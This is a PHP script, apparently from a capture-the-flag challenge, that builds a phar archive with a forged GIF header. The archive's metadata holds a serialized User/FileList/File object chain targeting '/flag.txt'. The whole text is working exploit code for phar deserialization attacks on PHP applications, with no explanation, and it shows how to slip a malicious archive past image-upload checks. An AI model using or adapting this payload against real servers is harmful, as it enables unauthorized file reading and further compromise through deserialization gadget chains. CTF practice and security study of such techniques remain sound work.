<?php
class User {
    public $db;
}

class FileList {
    private $files;
    public function __construct(){
        $this->files = array(new File());
    }
}

class File {
    public $filename = "/flag.txt";
}

$phar = new Phar('phar.phar');
$phar->startBuffering();
$phar->setStub('GIF89a'."<?php __HALT_COMPILER();?>"); // 这里的GIF89a是伪造gif
$phar->addFromString('test.txt', 'test');
$object = new User();
$object->db = new FileList();
$phar->setMetadata($object);
$phar->stopBuffering();